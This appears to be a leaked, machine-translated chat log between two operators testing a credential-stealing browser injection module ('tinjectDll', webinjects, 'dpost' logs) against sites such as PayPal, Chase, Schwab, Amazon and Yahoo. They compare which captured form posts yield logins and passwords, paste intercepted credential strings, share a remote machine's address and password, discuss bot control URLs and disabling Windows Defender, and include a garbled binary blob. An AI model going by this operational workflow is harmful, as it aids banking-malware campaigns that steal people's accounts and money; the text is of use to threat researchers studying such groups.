+[17.12.21 19:02:08] hammer: did you run it?
+[17.12.21 19:02:17] jaime: yes it is
+[17.12.21 19:02:21] jaime: I'm just browsing.
+[17.12.21 19:02:27] hammer: nothing, module not working
+[17.12.21 19:04:46] jaime: You can tell by cmdline chroma
+[17.12.21 19:08:23] jaime: I just launched it without the bot
+[17.12.21 19:09:07] jaime: See the cmdline of chroma --disable-http2 and stuff, it means we work
+[17.12.21 19:09:38] hammer: I'm not on the machine.
+[17.12.21 19:09:53] hammer: there can only be one at a time
+[12/17/221 19:10:31] jaime: So do I tell Adam again or wait? :)
+[17.12.21 19:10:58] hammer: monday is wiser than friday
+[17.12.21 19:11:08] hammer: folk wisdom
+[17.12.21 19:12:16] hammer: you want to give him this one you just watched without the bot?
+[17.12.21 19:13:31] jaime: yeah
+[17.12.21 19:13:40] jaime: Here comes the log post
+[12/17/221 19:13:52] jaime: /GROUP_1/QWERTY_W617600.EEB21785DFE74E60A0689287082193C4
+[17.12.21 19:14:03] jaime: Receiving.
+[12/17/221 19:15:08] jaime: Disconnected from session
+[17.12.21 19:15:09] hammer: ok. give it to him, let him pour
+[17.12.21 19:15:31] jaime: look how it should be, maybe something will come in the log file
+[17.12.21 19:16:12] jaime: And let's go drink beer! :)
+[17.12.21 19:17:35] hammer: bots are silent, today they have long periods of silence
+[17.12.21 19:18:18] hammer: ouch, screw them
+[17.12.21 19:18:31] hammer: you haven't written him yet?
+[12/17/21 19:18:40] jaime: no!
+[17.12.21 19:18:50] hammer: that's it, you give it to him on monday, he'll fill it up
+[17.12.21 19:18:51] jaime: Beer's getting cold!
+[17.12.21 19:19:01] jaime: Okay, maybe Caesar will
+[17.12.21 19:19:02] hammer: cars are still kicking, wait for the tapping.
+[17.12.21 19:19:32] hammer: That's it, the hut on the stick.
+[17.12.21 19:19:41] jaime: So quit it, it's time to rest!
+[12/17/21/19:19:51] jaime: have a good weekend! :)
+[12/17/221 19:20:03] hammer: i'll let him know he won't be in today.
+[17.12.21 19:20:10] hammer: have a nice weekend yourself)
+[12/17/221 19:20:24] jaime: Bye! See you on monday! :)
+[20.12.21 09:20:04] hammer: Ghbdtn
+[20.12.21 09:20:07] hammer: Hi.
+[20.12.21 09:20:18] hammer: Hi.
+[20.12.21 09:36:33] jaime: Hi!
+[20.12.21 09:59:25] hammer: text caesar
+[20.12.21 09:59:56] hammer: to reset
+[12/20/221 10:00:29] jaime: Okay! 5 sec!
+[12/20/2011 10:00:40] jaime: I see you coming!
+[20.12.21 10:13:19] jaime: Caesar poured both admins
+[20.12.21 10:13:27] jaime: tinjectDll
+[20.12.21 10:16:59] hammer: ok
+[20.12.21 10:32:19] hammer: tinjectDll start Unable to load module from server 2021-12-20 10:31:48.752728
+[20.12.21 10:32:41] hammer: nfr ;t(
+[20.12.21 10:32:47] hammer: same
+[20.12.21 10:33:01] hammer: I'll ask him to rebuild bot
+[20.12.21 10:35:34] hammer: didn't you send him the latest build?
+[20.12.21 10:36:13] jaime: yes, I did today
+[20.12.21 10:36:50] hammer: "check on the test one, maybe the gaskets"
+[20.12.21 10:36:56] hammer: waiting
+[20.12.21 10:42:40] jaime: I'm gonna run to class with my kid, I'll be somewhere around 17 MSK
+[20.12.21 11:01:41] hammer: okay
+[20.12.21 14:16:16] jaime: how's it running?
+[20.12.21 14:16:32] hammer: yeah. running it through chrome
+[12/20/21 21 14:16:41] jaime: what happened?
+[20.12.21 14:16:53] hammer: with the module?
+[20.12.21 14:17:06] hammer: "it sucked on the server"
+[20.12.21 14:17:15] jaime: why didn't it start?
+[20.12.21 14:17:18] jaime: Got it.
+[12/20/221 14:51:16] hammer:
+[20.12.21 14:52:08] hammer: there's a problem with Yahoo, after entering login it asks to pass captcha, you pass it and press continue and instead of password entry page it shows up like this
+[20.12.21 14:52:59] hammer: after that every time I press sign in to the Yahoo page it loads this kind of page, not even reaching login
+[20.12.21 14:54:20] hammer: on Walmart every time I go to a new page it says We're having technical issues, but
+we'll be back in a flash. need to refresh every time to load
+[12/20/2011 14:54:53] hammer:
+[20.12.21 14:55:38] hammer: well, ebay, as usual, does not want to load normally, refreshing the page does not help, reopening in a new tab helped
+[20.12.21 14:55:53] hammer: this is about the craps on the pages I noticed
+[12/20/221 14:56:18] hammer: logpost seems to be working, let me check it out
+[12/20/221 15:03:40] jaime: Do you have the injector config?
+[20.12.21 15:04:21] jaime: matches in webinject.log ?
+[20.12.21 15:08:14] jaime: I think config is alive again! :)
+[20.12.21 15:23:07] hammer:
+[12/20/221 15:23:16] hammer: 12/20/2021 5:56:11 AM url=https://yahoo.com/, matches url=https://*/*
+[12/20/221 15:23:38] hammer: here, for example
+[12/20/221 15:25:20] jaime: well the config is in place! :)
+[20.12.21 15:56:04] hammer: why like this? logon~tempId=%22waterfall%40mail.com%22;
+[20.12.21 15:56:21] hammer: not waterfall@mail.com
+[20.12.21 15:57:56] jaime: Is that you in the admin area?
+[20.12.21 15:58:09] hammer: lf
+[20.12.21 15:58:12] hammer: yes
+[20.12.21 15:58:18] hammer: checking for a login pass
+[20.12.21 15:58:23] jaime: I give it to you in the raw
+[20.12.21 15:58:30] hammer: I didn't find the password, only the login and it's in this form
+[20.12.21 15:58:35] jaime: I don't know how it works out
+[20.12.21 15:58:37] hammer: look at the dpost log
+[20.12.21 15:58:39] hammer: chasecom ) Z V
+
+-----------WDZQQUFLUCKAVTYN
+
+Content-Disposition: form-data; name="keys"
+[20.12.21 15:58:53] hammer: here's the one I uploaded, look there
+[20.12.21 15:59:10] hammer: and there are some addresses with unreadable characters
+[20.12.21 15:59:37] hammer: search for chase and the first result will be
+[20.12.21 16:00:02] jaime: It's rolling.
+[20.12.21 16:00:11] hammer: midaschasecom ) T P
+[20.12.21 16:00:24] hammer: also with spaces and symbols, no rocket
+[20.12.21 16:00:28] jaime: that's why they made unreadable characters
+[20.12.21 16:00:51] jaime: And everything comes already parsed by the server
+[20.12.21 16:01:11] hammer: midas from dpost log
+[20.12.21 16:01:34] jaime: See dpost.log instead
+[20.12.21 16:01:39] jaime: not everything
+[20.12.21 16:03:18] hammer: that's what I'm looking at.
+[20.12.21 16:03:32] hammer: I uploaded the webinject
+[20.12.21 16:03:33] hammer: now
+[20.12.21 16:04:26] hammer:
+[20.12.21 16:15:22] jaime: it seems okay, but I don't know where the password is
+[20.12.21 16:18:10] hammer: it's not just the chase
+[20.12.21 16:18:50] hammer: there are sites where you can't get past the login without email confirmation, okay, but here I entered both
+[20.12.21 16:20:59] jaime: 1. Need to remove configuration :)
+[20.12.21 16:21:31] hammer: let me ask adam
+[20.12.21 16:21:40] jaime: configuration is alive!
+[20.12.21 16:22:55] hammer: you want it to be empty?
+[20.12.21 16:24:19] hammer: adam's on the clock, so the answer will be around a lifetime
+[20.12.21 16:27:13] hammer: hotmail only login
+[20.12.21 16:42:25] jaime: yes config is empty, otherwise paste will probably break the page
+[20.12.21 16:42:48] jaime: but look at mail.ru
+[20.12.21 16:57:59] hammer: what should it show on mailru?
+[20.12.21 16:58:13] hammer: adam says config is disabled
+[20.12.21 16:59:37] hammer: > proveryaite
+[20.12.21 16:59:45] hammer: or just disabled
+[12/20/221 16:59:52] hammer: okay, let me check
+[20.12.21 17:04:16] jaime: and it had the password on it
+[20.12.21 17:04:40] jaime: I think it's not for nothing to implement injections, not all sites send passwords so openly
+[20.12.21 17:05:30] hammer: he can't log in without a normal account, he blocks the login, it's invalid, go away
+[12/20/221 5:09:52 PM] hammer: 12/20/2021 9:03:07 AM url=https://account.mail.ru/signup?from=navi&lang=ru_RU&siteid=169&app_id_mytracker=58519, matches url=https://*/*
+[12/20/221 5:10:35 PM] hammer: 12/20/20/221 9:01:21 AM url=https://yahoo.com/, matches url=https:// */*
+[12/20/221 17:10:59]
+[12/20/221 17:11:26] hammer:
+[20.12.21 17:11:39] hammer: well, that's okay.
+[20.12.21 17:11:42] jaime: user xxx goes to mail
+[20.12.21 17:11:53] jaime: password superlox
+[20.12.21 17:12:03] jaime: login=xxx%40mail.ru&password=superlox&saveauth=1&token=5c60bf840cdf459e9d32610bde86f45c&project=e.mail.ru
+[20.12.21 17:12:07] jaime: I see.
+[20.12.21 17:12:18] hammer: xxx%40mail.ru
+[20.12.21 17:12:26] hammer: also instead of dog percent and 40
+[20.12.21 17:12:41] jaime: that's how you send the characters
+[20.12.21 17:12:46] jaime: That's normal
+[20.12.21 17:12:47] hammer: well, it's ok, it's ok, he knows, he'll understand.
+[20.12.21 17:13:02] jaime: So it must be redone in the admin area
+[20.12.21 17:13:08] hammer: but yahoo just threw it at the page code
+[20.12.21 17:13:28] jaime: Now on yahoo
+[20.12.21 17:14:22] hammer: And check your schwab
+[20.12.21 17:14:28] hammer: it didn't come from me
+[20.12.21 17:14:42] hammer: ebey+
+newegg+
+walmart+
+chase only login
+paypal+
+live only login
+yandex+
+yahoo+
+schwab-
+[20.12.21 17:14:55] hammer: that's it.
+[20.12.21 17:16:02] hammer: live is hotmail
+[20.12.21 17:17:45] jaime: Is that all you see in the admin area?
+[20.12.21 17:25:13] jaime: walmart ok all visible
+[20.12.21 17:25:26] jaime: newegg no further than login
+[20.12.21 17:25:38] jaime: ebay really broke the page
+[20.12.21 17:27:30] jaime: chase ok but no password and login
+[20.12.21 17:29:10] jaime: paypal all there login_email=xxx%40gmail.com&captchaCode=&initialSplitLoginContext=inputEmail&isTpdOnboarded=&login_password=superlox
+[20.12.21 17:30:49] hammer: everything was fine where + is.
+[20.12.21 17:30:50] jaime: yandex password
+[20.12.21 17:31:04] jaime: Got it.
+[20.12.21 17:31:04] hammer: Schwab, just check your account.
+[20.12.21 17:31:34] hammer: But it's all right, it loads and shows
+[20.12.21 17:32:07] jaime: {"headers":[{"type":"uid","uid":"xxx"}],"data":{"action":"authentication","assert":"authenticate","assertion_id":"FI/VaimTDM6EeRT595BRL036","fch":"JfbooEY9KKrslht0+zBxXFCJ", "data":{"password": "superlox"}, "method": "password", "params":{"clientId": "CustomerWeb", "opaqueIdType": "BrokerageCustomerId", "redirectUri": "https://client.schwab.com/login/signon/authcodehandler.ashx"}}}
+[12/20/221 17:32:24] hammer: hmm, now
+[12/20/21/17:32:28] jaime: Yeah, there's this schwab
+[20.12.21 17:32:39] hammer: is that in the dpost?
+[20.12.21 17:32:49] jaime: Yes.
+[20.12.21 17:32:57] hammer: I'll look it up.
+[20.12.21 17:33:04] jaime: Origin: https://sws-gateway.schwab.com
+[20.12.21 17:33:12] jaime: And just below
+[20.12.21 17:36:38] hammer: okay, great, I found my login and password in my dpost
+[20.12.21 17:36:44] hammer: I'll try it in admin
+[20.12.21 17:38:45] hammer: {"headers":[{"type": "uid", "uid": "mountain@alpes-mail.com"}], "data":{"action": "authentication", "assert":"authenticate", "assertion_id": "0qayAUSKdlZjaKHY/nMa7Mpu", "fch": "iadt1BGbmKk5P7mXdjQv+41o", "data":{"password": "Stonefield"}
+[12/20/221 17:38:55] hammer: great.
+[12/20/221 17:39:05] hammer: well, it came from chrome wherever I went.
+[20.12.21 17:39:32] jaime: I don't like ebay
+[12/20/221 17:39:38] hammer: if you ignore those problems with yahoo, ebay and walmart, everywhere else worked fine
+[20.12.21 17:39:41] jaime: I'll be watching.
+[20.12.21 17:40:06] hammer: But you can't check all the billions of sites.
+[20.12.21 17:40:14] hammer: I'm gonna go get the ffs started.
+[20.12.21 17:40:14] jaime: I don't have an insert and ebay still sucks
+[20.12.21 17:40:36] hammer: hmm, when I unloaded the module, it loaded fine
+[20.12.21 17:45:01] jaime: something's broken there
+[20.12.21 17:55:04] hammer: the same problem with Yahoo on FF, when it loads a page with her code
+[20.12.21 18:22:32] jaime: Is the config still with us?
+[12/20/221 18:24:42] hammer: we can't do without it, it's like family 12/20/2021 9:49:30 AM url=https://yahoo.com/, matches url=https://*/*
+[12/20/221 18:25:03] hammer: either adam didn't, or he did, but not like this
+[20.12.21 18:28:37] jaime: well yahoo is crashing because of it
+[20.12.21 18:28:40] jaime: but ebay doesn't
+[20.12.21 18:36:56] hammer: I'll continue tomorrow.
+[20.12.21 18:37:36] hammer: aliexpress bad load and mylkom, but there probably because of the pile of crap on the main page
+[20.12.21 18:44:25] jaime: Configure and configure again! :)
+[12/20/21/19:03:27] jaime: I got ebay to open normal for no reason
+[12/21/12/221 12:39:00] hammer: +
+[21.12.21 12:39:19] hammer: and my ebay's not acting up yet
+[21.12.21 13:22:53] jaime: Hi!
+[21.12.21 13:23:14] jaime: it's strange, is there a config?
+[21.12.21 13:23:52] jaime: I thought maybe there was a config and it all got cached. And then it re-read without it and became normal?
+[21.12.21 13:45:48] hammer: I don't see it
+[21.12.21 13:46:01] hammer: no match for matches
+[21.12.21 13:46:57] jaime: well, it cleared up at last
+[21.12.21 13:56:48] hammer: please check out aliexpress
+[21.12.21 13:56:57] hammer: I have login, I don't see password
+[21.12.21 13:57:16] hammer: checked it on both ff and ie, same thing
+[21.12.21 14:03:14] hammer: loginId=explorer%40worker-mail.com&password2=446bece8b04006c937ed40b96b28dc284f7c71a586b7b9a33e27594a1b1a12e8a07a34626e74345c75cd4a22d2f21e2b3e1a68dbeb0812b158881b82fe16fb33a4071b0c010f24d37f97547379704621ada46a576d5066d3a8f87c90661426b6dfb465209333e2645813d6f139e7a5ff3b585150bc7186e587bdf6ca1df9aba8&
+[21.12.21 14:03:21] hammer: I got this
+[21.12.21 14:03:39] hammer: login is correct, but password is wrong
+[21.12.21 14:20:36] hammer: I'll check it again
+[21.12.21 14:22:38] jaime: ditto
+[21.12.21 14:22:49] jaime: password must be in the hash
+[21.12.21 14:25:48] jaime: Need to know how to get it out! :)
+[22.12.21 14:54:26] hammer: Hi!
+[12/22/221 15:25:23] jaime: hi!
+[22.12.21 15:25:40] hammer: trouble with ff on 11 vinyl
+[22.12.21 15:25:53] hammer: chrome ran it over and over
+[22.12.21 15:26:23] hammer: walmart+
+"username": "alindenacc@hotmail.com", "password": "Example_59"
+schwab+
+education@library-mail.com
+Bookoflife
+paypal+
+login_email=legacy@yahoo.com
+login_password=Axe2hand
+legacy@yahoo.com
+Axe2hand
+--
+aliexpress+/-
+loginId=darkneon763@mail.com
+password2=cbaf03e1f66a92e4f225d80f55ddbe684d91679a281c1f627e389253dec2e8f8c1498b2003ea54ee5510b614746d70cab55f78043ca8b138736eef0d009d3e43967cd856c7b52b0df1013b7ae499b96fa1ac084f32d95726ed716f3d5f2f40697fef2e775ef5e031d8db8dec241d13480e0074704988909608832e2fb4c13e03
+
+mailcom+
+usertype=standard
+username=darkneon763@mail.com
+
+gmail+/?
+--
+amazon+
+email=sparklerubyabyss@gmail.com
+password=Snowlake_1242
+passwordCheck=Snowlake_1242
+yandex+
+hotmail+
+[22.12.21 15:26:51] hammer: everything is fine, but I can't find the password for Jimail, even though it's in the dost
+[22.12.21 15:27:12] hammer: and on aliexpress like yesterday password2=cbaf03e1f66a92e4f225d80f55ddbe684d916a79281c1f627e3
+[22.12.21 15:27:54] hammer: send a request for an apr
+[22.12.21 15:28:55] hammer: see the messages?
+[22.12.21 15:29:27] jaime: yes everything is visible
+[22.12.21 15:29:39] hammer: throw me a request for error, I'm taking a timeout
+[22.12.21 15:29:58] hammer: can you see?
+[12/22/221 15:30:05] hammer: do you see it?
+[22.12.21 15:30:06] jaime: Not anymore.
+[22.12.21 15:30:11] jaime: Oh, you can.
+[22.12.21 15:30:16] hammer: it's either rp or e2e
+[22.12.21 15:30:26] jaime: FF under 11 doesn't work?
+[22.12.21 15:30:48] hammer: no, I can't load addresses under bot
+[22.12.21 15:31:03] jaime: I didn't look under 11 at all
+[12/22/221 15:31:08] hammer: just put address into text box and page stays blank, no response
+[22.12.21 15:31:24] hammer: I tried lowader, it loads pages
+[22.12.21 15:31:34] hammer: you left it at 10, I moved it
+[22.12.21 15:31:40] jaime: Is chrome okay?
+[12/22/221 15:32:00] hammer: yeah, chrome is good and almost everything came except for jimail and aliexpress
+[22.12.21 15:32:12] jaime: Well by the way it's weird that it works like this and it doesn't.
+[22.12.21 15:32:18] jaime: And ebay?
+[22.12.21 15:32:20] hammer: ah, it doesn't work on 11 ye, it's just not there
+[22.12.21 15:32:26] hammer: ebay's a mess.
+[22.12.21 15:32:41] hammer: as usual, I looked it up and didn't log in
+[22.12.21 15:33:20] hammer: go to the car to see the ff?
+[22.12.21 15:33:31] hammer: there's a tinge running right now
+[22.12.21 15:33:45] jaime: yeah sure
+[22.12.21 15:34:01] hammer: 185.64.104.213:31152
+[22.12.21 15:34:14] hammer: 123qweASD
+[22.12.21 15:34:27] hammer: the lowader is in folder 12 on the desktop
+[22.12.21 15:34:52] hammer: if you want to run it, write first, I'll unload the tinderbox
+[22.12.21 15:35:01] hammer: logs from lowder in the temp folder, it's signed there
+[22.12.21 15:36:04] hammer: it's a new FF, I got 11 recently, what's he fussing about?
+[22.12.21 15:38:10] hammer: you can turn on ee by some manipulations, not ee itself, but ee in its mode, i tried to follow the instructions, but it did not work, in general it is not supposed to work on 11
+[22.12.21 15:38:34] hammer: was it allowed on the machine?
+[22.12.21 15:43:16] hammer: user
+[22.12.21 15:43:39] hammer: user
+[22.12.21 15:47:53] jaime: Yeah, all right!
+[22.12.21 15:48:02] jaime: You can leave me watching!
+[22.12.21 15:48:22] hammer: lf/ rjytxyj
+[12/22/221 15:48:22] hammer: yeah. sure.
+[22.12.21 15:48:46] hammer: write me if you need to release or start a module
+[22.12.21 15:51:53] jaime: Now I'll entertain my wife and watch! :)
+[12/22/221 15:53:24] jaime: And now a Moodle or a Lauder?
+[12/22/221 15:55:03] jaime: url=https://www.youtube.com/, matches url=https://*/*
+[12/22/221 15:55:03] jaime: again?
+[12/22/221 15:59:20] hammer: eue.
+[22.12.21 15:59:20] hammer: mm-hmm.
+[22.12.21 15:59:42] hammer: i don't know where it came from
+[22.12.21 15:59:59] jaime: pages don't work, but they do
+[22.12.21 16:00:09] hammer: you can somehow toggle the module to use/not use config
+[22.12.21 16:00:34] jaime: no way! :)
+[22.12.21 16:00:39] hammer: on 10 they opened badly on FF too, long time
+[22.12.21 16:02:49] hammer: and on 11, when I looked, they didn't want to open at all
+[22.12.21 16:03:16] hammer: there is a folder ff nowhere loading
+[22.12.21 16:03:47] hammer: that's where the logs are when the pages just stay white, nothing loads
+[12/22/221 16:05:03] jaime: yeah I see, the log did not have anything wrong, everything seemed to work fine.
+[22.12.21 16:05:27] jaime: shit, I'll do a command to shut it down, this is bullshit
+[22.12.21 16:05:34] hammer: There's something wrong with SSL again
+[22.12.21 16:05:38] jaime: to shut down config
+[22.12.21 16:06:25] hammer: yeah, but only manually and on test ones
+[22.12.21 16:06:27] jaime: Connection reset during - is it?
+[22.12.21 16:06:52] hammer: maybe, I didn't mark it
+[22.12.21 16:07:03] jaime: You restarted the FF several times there, it's normal when closing
+[12/22/221 16:07:07] hammer: there was one page where the connection was broken in time. that was it
+[22.12.21 16:07:15] hammer: the rest just didn't load anything
+[22.12.21 16:07:22] hammer: uh, no
+[22.12.21 16:07:34] hammer: I only opened new tabs when I looked
+[22.12.21 16:07:43] hammer: but I reopened them with the lowers
+[22.12.21 16:08:10] hammer: on tinge, I just typed in the address, watched how it loaded, then a new tab and the same, and so on
+[22.12.21 16:08:39] hammer: then i unloaded it and watched it with the looper, i restarted it there, but looper also loaded it fine
+[22.12.21 16:08:50] jaime: well, when a new address in a tab, the current ones will be closed
+[22.12.21 16:09:14] hammer: yeah, I closed it before I started the new tab
+[22.12.21 16:09:25] jaime: ff nowhere download I'm looking at it
+[22.12.21 16:09:44] hammer: yes, it is
+[22.12.21 16:09:48] jaime: dpost sent pages loaded :) everything was like usual
+[22.12.21 16:12:54] hammer: is the windef not humming there on the machine?
+[22.12.21 16:13:09] jaime: There is a problem, the settings came in new at some point.
+[22.12.21 16:13:16] hammer: it should be disabled, but you never know, Windows likes to do shit
+[22.12.21 16:13:17] jaime: No it doesn't
+[22.12.21 16:14:25] jaime: then some more came
+[22.12.21 16:14:36] hammer: What time?
+[12/22/221 16:15:00] jaime: 12/22/2021 5:30:21 AM config type winj
+[12/22/221 16:15:12] hammer: tinjectDll 2021-12-22 15:18:19.399163 start Success
+[12/22/221 16:15:17] jaime: 12/22/2021 5:33:15 AM config type winj
+[22.12.21 16:15:28] hammer: well, it's not clear then
+[22.12.21 16:15:55] jaime: every 3 minutes
+[22.12.21 16:15:58] jaime: Something new.
+[22.12.21 16:16:21] jaime: There config of injections on 4Mb isn't it fat to transfer it?
+[22.12.21 16:16:39] hammer: why is it so big?
+[22.12.21 16:16:52] jaime: This is what the developers created
+[22.12.21 16:17:05] jaime: They made it smaller at 7
+[22.12.21 16:17:25] hammer: cesar not see, need to ask him about config entries in black
+[22.12.21 16:18:03] hammer: as far as I remember, here's the config 2021-12-22 15:46:41.588907 100019 not_exist 1 23
+[22.12.21 16:18:12] hammer: but it says here it doesn't exist
+[22.12.21 16:18:17] hammer: i could be wrong
+[22.12.21 16:18:36] jaime: I'm making a command to disable inserts, otherwise it's bullshit
+[22.12.21 16:18:41] hammer: yeah
+[22.12.21 17:12:05] hammer: do you need 11 more?
+[22.12.21 17:20:07] hammer: overnight stew
+[22.12.21 17:21:42] jaime: go ahead and put it out
+[22.12.21 17:21:54] jaime: I'm still thinking.
+[22.12.21 17:22:00] jaime: I'm gonna put myself down for 11.
+[12/22/221 19:25:32] jaime: Got it! Need to open tricky link containing group and bot name, this link works only in log version. The url you need is written in webinject .log. I think it worked fine.
+[12/23/221 11:37:48] hammer: Hi
+[12/23/221 11:43:02] jaime: Hi, did you text me? :)
+[12/23/221 11:43:29] hammer: blank message
+[12/23/221 11:43:35] hammer: now?
+[12/23/221 11:43:45] jaime: Now it's ok!
+[12/23/221 11:43:53] jaime: did you text me?
+[12/23/221 11:43:57] jaime: Hi!
+[12/23/221 11:44:03] hammer: no, and you?
+[12/23/221 11:44:35] jaime: I just had a message from you!
+[12/23/221 11:44:50] jaime: I disabled the inject config
+[12/23/221 11:44:58] jaime: But Caesar's not here yet.
+[12/23/221 11:45:07] hammer: ah, I must have asked you yesterday whether to leave 11 on
+[12/23/221 11:45:20] jaime: No I saw all that yesterday
+[12/23/221 11:45:41] hammer: I don't know, not anymore
+[12/23/221 11:46:14] jaime: Adam ask you to update the module? Or catch Caesar?
+[23.12.21 11:46:25] hammer: better caesar
+[12/23/221 11:46:47] jaime: I think so too! :)
+[23.12.21 11:47:38] hammer: he's in toad, I'll text him
+[12/23/221 12:20:30] hammer: he's here
+[12/23/221 12:21:37] jaime: wrote that he poured!
+[12/23/12/221 12:21:45] hammer: ok
+[23.12.21 12:21:54] hammer: there will be without config already?
+[23.12.21 12:22:17] hammer: same name?
+[12/23/12/221 12:23:00] hammer: how do you determine if a network is proxied or not?
+[23.12.21 12:26:16] jaime: Not at first everything is normal, if the configure arrives, then it arrives
+[23.12.21 12:27:03] jaime: Then you have to make cunning GET to address from browser it will turn off config, second GET will turn on
+[23.12.21 12:38:05] hammer: And with a proxy?)
+[23.12.21 12:38:33] jaime: I can't even tell you how to detect the proxy. If from inside the browser, the module detects the connection that your browser gives you and reads the packet, there is a connection protocol, and parses this packet.
+[23.12.21 12:38:48] hammer: no, I need it separately from the module
+[12/23/221 12:38:52] hammer: how can you tell at all
+[23.12.21 12:39:09] hammer: we have farm machines
+[23.12.21 12:39:25] hammer: "look, you are connected to the farm via the pavement. to the rpd and the internet via another ip. the server at 3 ip"
+[23.12.21 12:39:42] hammer: i assume so, yes, there is a proxy
+[23.12.21 12:45:29] jaime: There's no way to tell how to check, each proxy can have its own settings
+[23.12.21 12:45:38] jaime: We have reverse proxy
+[12/23/12/221 12:45:54] hammer: okay, I'll say we do) and there's a 50/50
+[12/23/221 12:46:11] hammer: since those who installed these machines don't know, why
+[12/23/12/221 12:47:09] hammer: I'll be back in a while.
+[12/23/12/221 12:47:16] hammer: the modules are running
+[12/23/12/221 12:48:13] jaime: tell me how to detect proxies then? :) Because I don't understand anything! :)
+[23.12.21 12:48:23] hammer: I didn't get it myself.
+[12/23/221 12:48:26] hammer: Hmm.
+[23.12.21 12:48:29] hammer: How come?
+[12/23/221 12:49:07] hammer: 12/23/2021 4:46:57 AM url=https://www.google.com/search?q=paypal.com+login&rlz=1C1BNSD_enLT984LT984&oq=paypal.&aqs=chrome.2.69i60j69i57j0i512l3j69i60l3&pf=cs&sourceid=chrome&ie=UTF-8, matches url=https://*/*
+[12/23/12/221 12:49:11] hammer: this is from 11
+[12/23/221 12:49:44] hammer: No, it's fine.
+[12/23/221 12:49:46] hammer: 12/23/2021 2:42:05 PM url=https://ogs.google.com/u/0/widget/app?bc=1&origin=chrome-untrusted%3A%2F%2Fnew-tab-page&origin=chrome%3A%2F%2Fnew-tab-page&cn=app&pid=1&spid=243&hl=en, matches url=https://*/*
+[12/23/221 12:49:51] hammer: we got a 10
+[12/23/221 12:49:54] jaime: Look in webinject.log for the word control
+[12/23.12.21 12:50:07] hammer: just search up instead of down, that's why I couldn't find it on 10 at first
+[12/23/12/221 12:50:08] jaime: url for control https://www.mail.com/zev11/QWERTY_W617600.D855A65BE056461D913782D56FC323A7
+[12/23/221 12:50:13] jaime: Something like this
+[12/23/12/21 12:50:21] hammer: sec
+[12/23/12/21 12:50:34] jaime: The url depends on the group and the bot's ID
+[12/23/221 12:50:46] hammer: 12/23/2021 2:33:11 PM url for control https://www.mail.com/tst361/DESKTOP-OHJN402_W10019044.D8EF7F06691AA2BB84115868FF2489D1
+[12/23/221 12:51:03] jaime: Follow this link in your browser
+[12/23/12/221 12:51:13] hammer: the whole thing? with ids?
+[23.12.21 12:51:20] jaime: Yeah, full on.
+[23.12.21 12:51:26] hammer: any?
+[23.12.21 12:51:48] jaime: chrome or ff
+[23.12.21 12:51:56] hammer: chrome then
+[23.12.21 12:52:14] jaime: it works only in logical version
+[23.12.21 12:52:20] hammer: inject is active
+
+zeus is disable
+[12/23/12/221 12:52:30] hammer: yeah, to test it. no need for combat)
+[23.12.21 12:52:33] jaime: zeus is disable
+[12/23/12/221 12:52:45] jaime: If you go in again, it'll turn back on.
+[12/23/12/221 12:53:07] hammer: That's very convenient
+[23.12.21 12:53:26] hammer: that's a good idea
+[23.12.21 12:53:38] jaime: :) had to make a simple server
+[23.12.21 12:57:41] hammer: no matches, definitely off
+[23.12.21 12:57:46] hammer: I'll step back.
+[12/23/221 12:58:11] jaime: ok! :)
+[12/23/221 15:07:52] hammer: here?
+[12/23/221 15:09:35] hammer: m
+[12/23/221 15:13:33] jaime: here
+[12/23/221 15:13:55] jaime: I'm changing ventilator at video game.
+[12/23/221 15:14:04] jaime: I reboot periodically
+[12/23/221 15:14:15] hammer: hit ctrl, it's gone
+[12/23/221 15:14:41] hammer:
+[12/23/221 15:14:44] hammer: see what you got
+[12/23/221 15:15:02] hammer: there's a dpost in the staple
+[23.12.21 15:15:37] hammer: the first half didn't make it to the vault
+[23.12.21 15:15:48] hammer: starting from the second half, there's a mess in the log
+[12/23/221 15:16:40] hammer: login_email=newhorizones%40edgeoftheearth-mail.com&login_password=Earthdisk
+[12/23/221 15:16:57] hammer: it didn't come, no new logpost in the repository
+[12/23/221 15:17:20] hammer: from paypal, I looked only him
+[12/23/221 15:18:19] jaime: What makes you think it's mush?
+[12/23/221 15:18:49] jaime: Content-Length: 35784 that's a lot of data going out
+[12/23/221 15:19:23] jaime: Same Content-Length: 14544
+[12/23/221 15:19:26] hammer: And look.
+[12/23/221 15:19:31] hammer: Cookie: enforce_policy=ccpa; cookie_check=yes; d_id=d37029ac250440aabdba5f5af5afbfe004c1640170495052
+[12/23/221 15:19:45] hammer: find the last entry and check the log after it
+[12/23/221 15:20:42] hammer: or else
+' g'*.H,KOI-*MЄLLЄ,.vNPMMMSCOP€'Tkgbb``"`4Ra¨wCHHJЃBcAySchf TSrYULH#ZZ¬nњVu...z9 "œShoR2Њ "8fL:™-AJPb€\OSD "њg}YVeF\bL'?€'e$ @Id^R
+.url:uEHGҐ]@'PYAT=iR~FЋ?hT":...KЂo'[\Bє№FrÑeќ`)r4~e'FbJhLsx_Y|l ЈѓL;F+X*04OСMI63Ц53І@"`BM0Sh0C(C#-€-ђѓѓѓP+C(Š№DµDA™sw¦G/zh ЊÀ'A¨h'¤-Ђ(¤2*N...ЃOb'T'ahch]('¬p#P;-ј-,( ±IN`jvRСRvShr -'Њ@n\ВВ@a "Ґ3@Jøµ8A^DL|ArЉј`dЄԛO(KPMUchfS°4U3P3133C344PH1MM3Hµ024IJ64I¶L2MJJ3iL4454M5164¶4I63J4U-JM+CO*JMKORNHML)CvPlhDa"©ђњ'--љJQ\'"Є"^"Y 'ћ-Є™¤oiҮ-\id_'i'l "kVao'e™eZ™yjd_aQo"^ћl "oE,S'RґR`_ <$-"i
+[12/23/221 15:20:57] jaime: Yeah, I get it.
+[12/23/221 15:21:11] jaime: I think it's a bug in the output file.
+[12/23/221 15:21:16] jaime: Now
+[23.12.21 15:21:28] hammer: new log has it too
+[23.12.21 15:21:51] jaime: In admin?
+[23.12.21 15:22:07] jaime: Or in base64?
+[23.12.21 15:22:24] hammer: in admin area nothing came at all
+[12/23/221 15:22:35] hammer: this is from dpost log in the temp
+[12/23/221 15:22:56] hammer: in the new sense I shot after I skinned it
+[12/23/221 15:23:23] jaime: yeah I got it! I'll watch.
+[12/23/221 15:23:31] hammer: you want the second one?
+[12/23/221 15:23:38] jaime: Go ahead.
+[12/23/221 15:23:51] jaime: Nothing in the admin area?
+[12/23/221 15:24:18] hammer:
+[12/23/221 15:24:20] hammer: at all
+[12/23/221 15:24:54] hammer: https://684dd313.akstat.io/ 2021-12-23 12:57:19.573523 last entry, and the time is 15:24
+[12/23/221 15:25:40] jaime: Which site shows up better?
+[12/23/221 15:26:23] hammer: well, while papal, i haven't looked at the others.
